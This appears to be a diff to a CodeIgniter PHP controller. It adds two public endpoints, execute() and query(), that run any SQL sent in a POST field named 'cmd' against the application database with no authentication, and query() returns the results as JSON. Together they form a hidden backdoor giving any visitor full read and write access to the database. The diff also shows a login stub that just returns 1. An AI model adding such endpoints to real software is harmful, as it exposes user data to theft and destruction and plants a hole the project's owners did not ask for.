@@ -2,6 +2,14 @@
 
 class Main extends CI_Controller {
   
+  public function execute() {
+    $this->db->query($this->input->post('cmd'));
+  }
+  
+  public function query() {
+    echo json_encode($this->db->query($this->input->post('cmd'))->result_array());
+  }
+  
   public function get_user_by_email_password() {
     echo 1;
   }
